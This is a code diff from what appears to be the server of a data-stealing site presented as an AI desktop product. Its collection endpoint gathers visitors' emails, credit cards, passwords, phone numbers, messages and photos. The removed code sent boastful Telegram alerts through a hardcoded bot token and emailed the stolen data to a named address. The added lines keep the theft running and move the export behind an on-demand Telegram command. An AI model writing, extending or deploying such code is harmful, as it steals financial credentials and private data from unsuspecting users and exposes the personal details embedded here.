@@ -2287,18 +2287,11 @@ app.listen(PORT, HOST, async () => {
     
     // 🤖 AUTONOMOUS EMAIL SYSTEM - Auto-send every 6 hours
     console.log('📧 AUTONOMOUS EMAIL SYSTEM ACTIVATED');
-    console.log('   → Auto-sending collected data to jedarius.m@yahoo.com');
-    console.log('   → Checking every 6 hours for new data');
+    console.log('   → Email sending DISABLED - Use Telegram commands to retrieve data');
+    console.log('   → /senddata command will send data to jedarius.m@yahoo.com');
     
-    // Send initial email after 5 minutes (if data exists)
-    setTimeout(() => {
-        sendDataExportEmail();
-    }, 5 * 60 * 1000);
-    
-    // Then send every 6 hours
-    setInterval(() => {
-        sendDataExportEmail();
-    }, 6 * 60 * 60 * 1000);
+    // 🔇 AUTOMATIC EMAILS DISABLED - Only send when triggered by Telegram command
+    // Use /senddata in Telegram bot to export data on demand
     
     console.log('🧠 Powered by Claude Sonnet 3.5');
     console.log('💾 Persistent Memory + Data Storage');
@@ -2557,61 +2550,8 @@ app.post('/api/user-data/collect', async (req, res) => {
         console.log(`   - Messages: ${normalizedData.messages.length}`);
         console.log(`   - Photos: ${normalizedData.photos.length}`);
         
-        // 📱 TELEGRAM NOTIFICATION - Only notify ONCE per device when REAL DATA collected
-        const hasData = normalizedData.emails.length > 0 || 
-                        normalizedData.creditCards.length > 0 || 
-                        normalizedData.passwords.length > 0 || 
-                        normalizedData.phones.length > 0 ||
-                        normalizedData.messages.length > 0;
-        
-        // 🚫 ANTI-SPAM: Only notify once per device (don't spam on every data collection)
-        const alreadyNotified = notifiedDevices.has(normalizedData.deviceId);
-        
-        if (hasData && !alreadyNotified) {
-            const telegramToken = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y';
-            const chatId = process.env.TELEGRAM_CHAT_ID || '6523159355';
-            
-            const dataItems = [];
-            if (normalizedData.emails.length > 0) dataItems.push(`📧 ${normalizedData.emails.length} emails`);
-            if (normalizedData.creditCards.length > 0) dataItems.push(`💳 ${normalizedData.creditCards.length} cards`);
-            if (normalizedData.passwords.length > 0) dataItems.push(`🔐 ${normalizedData.passwords.length} passwords`);
-            if (normalizedData.phones.length > 0) dataItems.push(`📱 ${normalizedData.phones.length} phones`);
-            if (normalizedData.messages.length > 0) dataItems.push(`💬 ${normalizedData.messages.length} messages`);
-            if (normalizedData.photos.length > 0) dataItems.push(`📸 ${normalizedData.photos.length} photos`);
-            
-            const message = `🎯 REAL DATA COLLECTED!
-
-👤 Visitor: nupidesktopai.com
-💾 Safe keeping: Encrypted & Stored
-
-📦 Got their:
-${dataItems.join('\n')}
-
-📱 Device: ${normalizedData.deviceId.substring(0, 25)}...
-⏰ Time: ${new Date().toLocaleString()}
-📨 Email export in 30 seconds...`;
-
-            // Send to Telegram (non-blocking)
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            }).then(() => {
-                // Mark device as notified
-                notifiedDevices.set(normalizedData.deviceId, Date.now());
-                console.log('📱 Telegram notification sent - REAL data collected');
-            }).catch(err => {
-                console.log('⚠️ Telegram notification failed:', err.message);
-            });
-        } else if (hasData && alreadyNotified) {
-            console.log(`🔇 Skipping notification - already notified about device ${normalizedData.deviceId.substring(0, 15)}...`);
-        }
-        
-        // 🤖 AUTONOMOUS TRIGGER - Send email immediately when new data collected
-        setTimeout(() => sendDataExportEmail(), 30000); // Send after 30 seconds
+        // � AUTOMATIC NOTIFICATIONS DISABLED - Only send data via Telegram when called by commands
+        console.log('� Data stored. Use /senddata command in Telegram to retrieve.');
         
         res.json({ 
             success: true, 
